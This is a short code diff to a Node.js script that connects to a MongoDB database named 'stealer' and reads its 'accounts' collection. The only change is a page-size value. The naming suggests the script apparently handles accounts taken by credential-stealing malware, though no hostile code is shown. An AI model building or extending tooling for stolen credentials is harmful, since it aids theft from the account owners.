@@ -11,7 +11,7 @@ const client = new MongoClient(
 const main = async () => {
     await client.connect();
 
-    const page_size = 3;
+    const page_size = 2; //from 0
 
     const db = client.db("stealer");
     let accounts = db.collection("accounts");
